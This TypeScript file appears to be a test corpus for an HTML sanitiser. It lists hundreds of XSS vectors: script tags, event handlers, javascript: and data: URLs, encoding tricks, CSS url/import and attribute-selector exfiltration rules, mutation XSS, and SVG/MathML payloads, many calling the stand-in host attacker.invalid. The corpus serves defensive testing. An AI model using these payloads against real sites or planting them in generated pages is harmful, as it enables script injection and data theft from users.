/**
 * XSS corpus for the sanitiser (task A-12). Each vector is hostile input; the sanitised output must contain no
 * executable construct and no URL outside the archive. Families: HTML5 security cheat-sheet vectors, `javascript:` in every
 * URL attribute, encoding tricks, CSS, mutation XSS, `srcdoc`, `<base>`, meta refresh, SVG and MathML.
 */
export interface Vector {
  name: string;
  html: string;
}

const A = "alert(1)";
const vectors: Vector[] = [];
const add = (name: string, html: string) => vectors.push({ name, html });

// --- 1. Classic cheat-sheet vectors ---------------------------------------------------------------------------------
add("script tag", `<script>${A}</script>`);
add("script src", `<script src=//attacker.invalid/x.js></script>`);
add("script uppercase", `<SCRIPT>${A}</SCRIPT>`);
add("script with newline in tag", `<scr\nipt>${A}</scr\nipt>`);
add("script nested to bypass strip", `<scr<script>ipt>${A}</scr</script>ipt>`);
add("script type module", `<script type=module>${A}</script>`);
add("img onerror", `<img src=x onerror=${A}>`);
add("img onerror quotes", `<img src="x" onerror="${A}">`);
add("img onerror backtick", `<img src=x onerror=\`${A}\`>`);
add("img slash separator", `<img/src=x/onerror=${A}>`);
add("img onload", `<img src="/ok.png" onload="${A}">`);
add("img dynsrc", `<img dynsrc="javascript:${A}">`);
add("img lowsrc", `<img lowsrc="javascript:${A}">`);
add("body onload", `<body onload=${A}>`);
add("body onpageshow", `<body onpageshow=${A}>`);
add("body background js", `<body background="javascript:${A}">`);
add("input autofocus onfocus", `<input autofocus onfocus=${A}>`);
add("select autofocus", `<select autofocus onfocus=${A}>`);
add("textarea autofocus", `<textarea autofocus onfocus=${A}></textarea>`);
add("keygen autofocus", `<keygen autofocus onfocus=${A}>`);
add("video source onerror", `<video><source onerror="${A}"></video>`);
add("video poster js", `<video poster=javascript:${A}></video>`);
add("audio onerror", `<audio src=x onerror=${A}>`);
add("details ontoggle", `<details open ontoggle=${A}>`);
add("marquee onstart", `<marquee onstart=${A}>x</marquee>`);
add("div onmouseover", `<div onmouseover="${A}">hover</div>`);
add("div style animation", `<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="${A}"></div>`);
add("button formaction", `<form><button formaction=javascript:${A}>x</button></form>`);
add("form action js", `<form action="javascript:${A}"><input type=submit></form>`);
add("form isindex", `<isindex action=javascript:${A} type=image>`);
add("input image src", `<input type=image src=x onerror=${A}>`);
add("object data", `<object data="javascript:${A}"></object>`);
add("object data html", `<object data="data:text/html,<script>${A}</script>"></object>`);
add("embed src", `<embed src="javascript:${A}">`);
add("embed svg data", `<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" type="image/svg+xml">`);
add("applet", `<applet code=x archive=y></applet>`);
add("iframe src js", `<iframe src="javascript:${A}"></iframe>`);
add("iframe srcdoc", `<iframe srcdoc="<script>${A}</script>"></iframe>`);
add("iframe srcdoc entity", `<iframe srcdoc="&lt;script&gt;${A}&lt;/script&gt;"></iframe>`);
add("iframe data html", `<iframe src="data:text/html,<script>${A}</script>"></iframe>`);
add("frameset", `<frameset onload=${A}><frame src=javascript:${A}></frameset>`);
add("link import", `<link rel=import href="//attacker.invalid/x.html">`);
add("link stylesheet external", `<link rel=stylesheet href="http://attacker.invalid/x.css">`);
add("link prefetch", `<link rel=prefetch href="http://attacker.invalid/x">`);
add("link preload", `<link rel=preload href="http://attacker.invalid/x" as=script>`);
add("link modulepreload", `<link rel=modulepreload href="http://attacker.invalid/x.js">`);
add("link dns-prefetch", `<link rel=dns-prefetch href="//attacker.invalid">`);
add("link preconnect", `<link rel=preconnect href="//attacker.invalid">`);
add("link onload", `<link rel=stylesheet href=/s.css onload=${A}>`);
add("meta refresh", `<meta http-equiv="refresh" content="0;url=javascript:${A}">`);
add("meta refresh external", `<meta http-equiv="refresh" content="0;url=http://attacker.invalid/">`);
add("meta set-cookie", `<meta http-equiv="set-cookie" content="a=b">`);
add("meta csp override", `<meta http-equiv="Content-Security-Policy" content="script-src *">`);
add("meta charset utf-7", `<meta charset="utf-7">+ADw-script+AD4-${A}+ADw-/script+AD4-`);
add("base href", `<base href="http://attacker.invalid/"><a href=/x>x</a><img src=/y.png>`);
add("base target", `<base target=_top><a href=/x>x</a>`);
add("base javascript", `<base href="javascript:${A}//"><a href=x>x</a>`);
add("a target top", `<a href="/x" target="_top">x</a>`);
add("a target parent", `<a href="/x" target="_parent">x</a>`);
add("a javascript", `<a href="javascript:${A}">x</a>`);
add("a data html", `<a href="data:text/html,<script>${A}</script>">x</a>`);
add("a data base64 html", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`);
add("a vbscript", `<a href="vbscript:msgbox(1)">x</a>`);
add("a livescript", `<a href="livescript:${A}">x</a>`);
add("a blob", `<a href="blob:http://attacker.invalid/uuid">x</a>`);
add("a file", `<a href="file:///etc/passwd">x</a>`);
add("a ping", `<a href="/x" ping="http://attacker.invalid/p">x</a>`);
add("a download", `<a href="/x" download="x.exe">x</a>`);
add("template", `<template><script>${A}</script></template>`);
add("noscript script", `<noscript><script>${A}</script></noscript>`);
add("noscript img onerror", `<noscript><img src=x onerror=${A}></noscript>`);
add("xmp", `<xmp><script>${A}</script></xmp>`);
add("plaintext", `<plaintext><script>${A}</script>`);
add("listing", `<listing><img src=x onerror=${A}></listing>`);
add("comment script", `<!--<script>${A}</script>-->`);
add("conditional comment", `<!--[if gte IE 4]><script>${A}</script><![endif]-->`);
add("cdata", `<![CDATA[<script>${A}</script>]]>`);
add("processing instruction", `<?xml-stylesheet href="javascript:${A}"?>`);
add("bgsound", `<bgsound src="javascript:${A}">`);
add("dialog", `<dialog open onclose=${A}></dialog>`);
add("portal", `<portal src="http://attacker.invalid/"></portal>`);
add("fencedframe", `<fencedframe src="http://attacker.invalid/"></fencedframe>`);
add("custom element handler", `<x-foo onclick=${A}>x</x-foo>`);
add("event handler spaces", `<img src=x onerror = ${A}>`);
add("event handler uppercase", `<IMG SRC=x ONERROR=${A}>`);
add("event handler null", `<img src=x on\u0000error=${A}>`);
add("attr without value then handler", `<img src=x alt onerror=${A}>`);
add("unclosed tag", `<img src=x onerror=${A}`);
add("unclosed attr quote", `<img src="x onerror=${A}>`);
add("tag name tricks", `<img/src/onerror=${A}>`);
add("table background", `<table background="javascript:${A}"><tr><td>x</td></tr></table>`);
add("td background", `<table><tr><td background="javascript:${A}">x</td></tr></table>`);
add("div data attribute url", `<div data-src="http://attacker.invalid/x" data-ncb-link="cached">x</div>`);
add("spoofed ncb link", `<a href="http://attacker.invalid" data-ncb-link="cached">x</a>`);
add("accesskey onclick", `<a href=/x accesskey=x onclick=${A}>x</a>`);
add("dom clobbering", `<form id=x><input name=attributes></form><img name=body id=body>`);
add("autoplay media", `<video src=/v.mp4 autoplay onplay=${A}></video>`);
add("track src", `<video><track src="http://attacker.invalid/t.vtt"></video>`);
add("img srcset external", `<img srcset="http://attacker.invalid/a.png 1x, http://attacker.invalid/b.png 2x">`);
add("img srcset js", `<img srcset="javascript:${A} 1x">`);
add("picture source", `<picture><source srcset="http://attacker.invalid/a.png"><img src="http://attacker.invalid/b.png"></picture>`);
add("img external src", `<img src="http://attacker.invalid/pixel.gif">`);
add("img protocol relative", `<img src="//attacker.invalid/pixel.gif">`);
add("img data svg", `<img src="data:image/svg+xml,<svg onload=${A}>">`);
add("img data html", `<img src="data:text/html,<script>${A}</script>">`);
add("img huge data uri", `<img src="data:image/png;base64,${"A".repeat(1_000_000)}">`);

// --- 2. javascript: in every URL attribute -----------------------------------------------------------------------------
const urlAttrs: [string, string][] = [
  ["a", "href"], ["area", "href"], ["link", "href"], ["img", "src"], ["img", "longdesc"], ["iframe", "src"], ["frame", "src"],
  ["embed", "src"], ["script", "src"], ["video", "src"], ["video", "poster"], ["audio", "src"], ["source", "src"], ["track", "src"],
  ["input", "src"], ["input", "formaction"], ["button", "formaction"], ["form", "action"], ["object", "data"], ["object", "codebase"],
  ["blockquote", "cite"], ["q", "cite"], ["ins", "cite"], ["del", "cite"], ["body", "background"], ["table", "background"],
  ["html", "manifest"], ["div", "href"], ["span", "src"], ["base", "href"], ["meta", "content"], ["a", "ping"], ["menuitem", "icon"],
  ["video", "dynsrc"], ["image", "src"], ["isindex", "action"],
];
for (const [tag, attr] of urlAttrs) add(`js url ${tag}[${attr}]`, `<${tag} ${attr}="javascript:${A}">x</${tag}>`);
for (const [tag, attr] of urlAttrs.slice(0, 16)) add(`data url ${tag}[${attr}]`, `<${tag} ${attr}="data:text/html,<script>${A}</script>">x</${tag}>`);
for (const [tag, attr] of urlAttrs.slice(0, 12)) add(`external url ${tag}[${attr}]`, `<${tag} ${attr}="http://attacker.invalid/x">x</${tag}>`);

// --- 3. Entity encoding and obfuscation of the scheme ----------------------------------------------------------------
const enc: [string, string][] = [
  ["entity decimal", "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"],
  ["entity decimal no semicolon", "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58alert(1)"],
  ["entity padded", "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)"],
  ["entity hex", "&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)"],
  ["named colon", "javascript&colon;alert(1)"],
  ["embedded tab", "jav\tascript:alert(1)"],
  ["embedded newline", "jav\nascript:alert(1)"],
  ["embedded cr", "jav\rascript:alert(1)"],
  ["entity tab", "jav&#x09;ascript:alert(1)"],
  ["entity newline", "jav&#x0A;ascript:alert(1)"],
  ["leading space", "   javascript:alert(1)"],
  ["leading control chars", "\u0001\u0002javascript:alert(1)"],
  ["leading entity space", "&#32;&#32;javascript:alert(1)"],
  ["mixed case", "JaVaScRiPt:alert(1)"],
  ["null byte", "java\u0000script:alert(1)"],
  ["fullwidth colon", "javascript：alert(1)"],
  ["url encoded scheme", "%6A%61%76%61%73%63%72%69%70%74:alert(1)"],
  ["double encoded", "&amp;#106;avascript:alert(1)"],
  ["vbscript entity", "&#118;bscript:msgbox(1)"],
  ["data html entity", "&#100;ata:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"],
  ["slashes", "\\\\attacker.invalid\\x"],
  ["protocol relative", "//attacker.invalid/x"],
  ["backslash host", "http:\\\\attacker.invalid\\x"],
  ["userinfo", "http://archive@attacker.invalid/"],
  ["unicode dots", "http://attacker。invalid/"],
];
for (const [name, v] of enc) add(`encoding: ${name}`, `<a href="${v}">x</a>`);
add("encoding: unquoted attribute", `<a href=javascript:alert(1)>x</a>`);
add("encoding: in img src", `<img src="&#106;avascript:alert(1)">`);
add("encoding: entity in tag name text", `<a href="/ok">&lt;script&gt;${A}&lt;/script&gt;</a>`);
add("encoding: utf7 body", `+ADw-script+AD4-${A}+ADw-/script+AD4-`);

// --- 4. CSS -------------------------------------------------------------------------------------------------------------
const css: [string, string][] = [
  ["expression", `x{width:expression(${A})}`],
  ["expression comment", `x{width:exp/**/ression(${A})}`],
  ["expression escape", `x{width:\\65 xpression(${A})}`],
  ["behavior", `x{behavior:url(xss.htc)}`],
  ["-moz-binding", `x{-moz-binding:url("http://attacker.invalid/xss.xml#xss")}`],
  ["javascript url", `x{background:url(javascript:${A})}`],
  ["javascript url quoted", `x{background:url("javascript:${A}")}`],
  ["javascript url escaped", `x{background:url(\\6a avascript:${A})}`],
  ["external url", `x{background:url(http://attacker.invalid/a.png)}`],
  ["external url protocol-relative", `x{background:url(//attacker.invalid/a.png)}`],
  ["import external", `@import url(http://attacker.invalid/x.css);`],
  ["import string", `@import "http://attacker.invalid/x.css";`],
  ["import javascript", `@import "javascript:${A}";`],
  ["import data", `@import url("data:text/css,*{background:url(http://attacker.invalid/)}");`],
  ["image-set external", `x{background:image-set(url(http://attacker.invalid/a.png) 1x)}`],
  ["image-set string", `x{background:image-set("http://attacker.invalid/a.png" 1x)}`],
  ["webkit image-set", `x{background:-webkit-image-set(url(http://attacker.invalid/a.png) 1x)}`],
  ["src function", `x{background:src("http://attacker.invalid/a.png")}`],
  ["image function", `x{background:image("http://attacker.invalid/a.png")}`],
  ["cross-fade", `x{background:cross-fade(url(http://attacker.invalid/a.png),url(http://attacker.invalid/b.png),50%)}`],
  ["font-face external", `@font-face{font-family:x;src:url(http://attacker.invalid/f.woff2)}`],
  ["font-face data", `@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA)}`],
  ["cursor external", `x{cursor:url(http://attacker.invalid/c.cur),auto}`],
  ["list-style-image", `x{list-style-image:url(http://attacker.invalid/a.png)}`],
  ["content url", `x::before{content:url(http://attacker.invalid/a.png)}`],
  ["mask", `x{mask:url(http://attacker.invalid/m.svg#m)}`],
  ["custom property url", `x{--bg:url(http://attacker.invalid/a.png);background:var(--bg)}`],
  ["var fallback url", `x{background:var(--nope,url(http://attacker.invalid/a.png))}`],
  ["element()", `x{background:-moz-element(#a)}`],
  ["paint()", `x{background:paint(evil)}`],
  ["attribute selector exfil", `input[value^="a"]{background:url(http://attacker.invalid/a)}`],
  ["namespace", `@namespace url(http://attacker.invalid/);`],
  ["document rule", `@-moz-document url-prefix(){x{background:url(http://attacker.invalid/)}}`],
  ["charset", `@charset "utf-7"; x{background:url(http://attacker.invalid/)}`],
  ["closing style tag", `x{content:"</style><script>${A}</script>"}`],
  ["closing style escaped", `x{content:"\\3c /style>\\3c script>${A}\\3c /script>"}`],
  ["unterminated url", `x{background:url(http://attacker.invalid/a.png`],
  ["unterminated string", `x{content:"</style><script>${A}</script>`],
  ["media wrapped", `@media screen{x{background:url(http://attacker.invalid/a.png)}}`],
  ["supports wrapped", `@supports (display:grid){x{background:url(http://attacker.invalid/a.png)}}`],
  ["html comment tokens", `<!-- x{background:url(http://attacker.invalid/a.png)} -->`],
];
for (const [name, v] of css) {
  add(`css style element: ${name}`, `<style>${v}</style><p>x</p>`);
}
for (const [name, v] of css.filter(([, v]) => !v.startsWith("@") && !v.includes("</style>"))) {
  const decl = v.replace(/^[^{]*\{/, "").replace(/\}$/, "");
  add(`css style attribute: ${name}`, `<p style="${decl.replace(/"/g, "'")}">x</p>`);
}
add("css style in svg", `<svg><style>x{background:url(http://attacker.invalid/a.png)}</style></svg>`);
add("css style attr with entities", `<p style="background:&#117;rl(http://attacker.invalid/a.png)">x</p>`);
add("css style media attr", `<style media="x;}</style><script>${A}</script>">p{}</style>`);

// --- 5. Mutation XSS -----------------------------------------------------------------------------------------------------
add("mxss noscript attribute", `<noscript><p title="</noscript><img src=x onerror=${A}>"></noscript>`);
add("mxss style in svg", `<svg></p><style><a id="</style><img src=1 onerror=${A}>">`);
add("mxss math style", `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=${A}&gt;">`);
add("mxss mglyph", `<math><mtext><table><mglyph><style><img src=x onerror=${A}>`);
add("mxss svg title", `<svg><title><a id="</title><img src=x onerror=${A}>">`);
add("mxss svg desc", `<svg><desc><![CDATA[</desc><script>${A}</script>]]></desc></svg>`);
add("mxss svg foreignObject", `<svg><foreignObject><p onclick=${A}>x</p><iframe src=javascript:${A}></iframe></foreignObject></svg>`);
add("mxss form nesting", `<form><math><mtext></form><form><mglyph><style></math><img src onerror=${A}>`);
add("mxss table form", `<table><form><input name=x onfocus=${A} autofocus></form></table>`);
add("mxss template nested", `<template><style></template><img src=x onerror=${A}></style></template>`);
add("mxss select option", `<select><template><option><style></select><img src=x onerror=${A}></style></option>`);
add("mxss textarea breakout", `<textarea></textarea><img src=x onerror=${A}>`);
add("mxss title breakout", `<title></title><img src=x onerror=${A}>`);
add("mxss comment breakout", `<!--><img src=x onerror=${A}>-->`);
add("mxss comment bang", `<!--!><img src=x onerror=${A}>-->`);
add("mxss comment end bang", `<!-- --!><img src=x onerror=${A}>-->`);
add("mxss noembed", `<noembed><img title="</noembed><img src=x onerror=${A}>">`);
add("mxss noframes", `<noframes><img title="</noframes><img src=x onerror=${A}>">`);
add("mxss iframe text", `<iframe><img title="</iframe><img src=x onerror=${A}>"></iframe>`);
add("mxss script in attribute", `<a title="<script>${A}</script>">x</a>`);
add("mxss backtick attr", `<div title=\`x\` onmouseover=${A}>`);
add("mxss svg a href", `<svg><a xlink:href="javascript:${A}"><text x=0 y=10>x</text></a></svg>`);
add("mxss nested svg html", `<svg><p><style><img src=x onerror=${A}></style></p></svg>`);
add("mxss p br in svg", `<svg></br><title><img src=x onerror=${A}>`);
add("mxss namespace confusion", `<math><mi><svg><desc><iframe><style></iframe><img src=x onerror=${A}>`);
add("mxss annotation-xml", `<math><annotation-xml encoding="text/html"><script>${A}</script></annotation-xml></math>`);
add("mxss listing newline", `<pre>\n<img src=x onerror=${A}></pre>`);
add("mxss option in select", `<select><option><img src=x onerror=${A}>`);
add("mxss plaintext svg", `<svg><plaintext><img src=x onerror=${A}>`);
add("mxss rawtext style close in comment", `<style><!--</style><img src=x onerror=${A}>-->`);
add("mxss script close case", `<ScRiPt >${A}</ScRiPt >`);
add("mxss double encoding", `<div title="&amp;lt;img src=x onerror=${A}&amp;gt;">x</div>`);

// --- 6. SVG and MathML ----------------------------------------------------------------------------------------------------
add("svg onload", `<svg onload=${A}>`);
add("svg script", `<svg><script>${A}</script></svg>`);
add("svg script href", `<svg><script href="data:text/javascript,${A}"></script></svg>`);
add("svg script xlink", `<svg><script xlink:href="data:text/javascript,${A}"></script></svg>`);
add("svg handler element", `<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">${A}</handler></svg>`);
add("svg animate href", `<svg><a><animate attributeName=href values=javascript:${A} /><text x=20 y=20>XSS</text></a></svg>`);
add("svg set href", `<svg><a><set attributeName=href to=javascript:${A} /><text x=20 y=20>XSS</text></a></svg>`);
add("svg animate onbegin", `<svg><animate onbegin=${A} attributeName=x dur=1s>`);
add("svg animateTransform", `<svg><animateTransform onbegin=${A}></animateTransform></svg>`);
add("svg use external", `<svg><use href="http://attacker.invalid/x.svg#a"></use></svg>`);
add("svg use data", `<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCc+PC9zdmc+#x"></use></svg>`);
add("svg use xlink js", `<svg><use xlink:href="javascript:${A}"></use></svg>`);
add("svg image external", `<svg><image href="http://attacker.invalid/a.png"></image></svg>`);
add("svg image onerror", `<svg><image href=x onerror=${A}></image></svg>`);
add("svg image svg data", `<svg><image href="data:image/svg+xml,<svg onload=${A}>"></image></svg>`);
add("svg foreignObject", `<svg><foreignObject><body onload=${A}></foreignObject></svg>`);
add("svg foreignObject iframe", `<svg><foreignObject><iframe src="http://attacker.invalid/"></iframe></foreignObject></svg>`);
add("svg a href", `<svg><a href="javascript:${A}"><circle r=10 /></a></svg>`);
add("svg style element", `<svg><style>@import url(http://attacker.invalid/x.css);</style></svg>`);
add("svg fill url external", `<svg><rect fill="url(http://attacker.invalid/x.svg#p)" width=10 height=10 /></svg>`);
add("svg filter external", `<svg><rect filter="url(http://attacker.invalid/x.svg#f)" width=10 height=10 /></svg>`);
add("svg fill url local", `<svg><defs><linearGradient id=g></linearGradient></defs><rect fill="url(#g)" width=10 height=10 /></svg>`);
add("svg style attr", `<svg><rect style="fill:url(http://attacker.invalid/a);behavior:url(x)" /></svg>`);
add("svg xml entity", `<svg><text>&xxe;</text></svg>`);
add("svg uppercase script", `<SVG><SCRIPT>${A}</SCRIPT></SVG>`);
add("svg set onbegin", `<svg><set onbegin=${A} attributeName=x to=1 /></svg>`);
add("svg discard", `<svg><discard onbegin=${A} /></svg>`);
add("svg mpath", `<svg><animateMotion><mpath href="javascript:${A}"/></animateMotion></svg>`);
add("svg tref", `<svg><tref xlink:href="http://attacker.invalid/x.svg#t"/></svg>`);
add("svg script in defs", `<svg><defs><script>${A}</script></defs></svg>`);
add("svg title html", `<svg><title><img src=x onerror=${A}></title></svg>`);
add("svg onclick on path", `<svg><path d="M0 0" onclick=${A} /></svg>`);
add("svg xmlns trickery", `<svg xmlns="http://www.w3.org/1999/xhtml"><script>${A}</script></svg>`);
add("math href", `<math href="javascript:${A}">click</math>`);
add("math maction", `<math><maction actiontype="statusline#" xlink:href="javascript:${A}">x</maction></math>`);
add("math mglyph", `<math><mglyph src="http://attacker.invalid/a.png"></mglyph></math>`);
add("math semantics", `<math><semantics><annotation-xml encoding="text/html"><img src=x onerror=${A}></annotation-xml></semantics></math>`);
add("math onclick", `<math><mi onclick=${A}>x</mi></math>`);
add("math script", `<math><script>${A}</script></math>`);
add("math style", `<math><style>x{background:url(http://attacker.invalid/)}</style></math>`);
add("math mtext html", `<math><mtext><img src=x onerror=${A}></mtext></math>`);

export const corpus: readonly Vector[] = vectors;
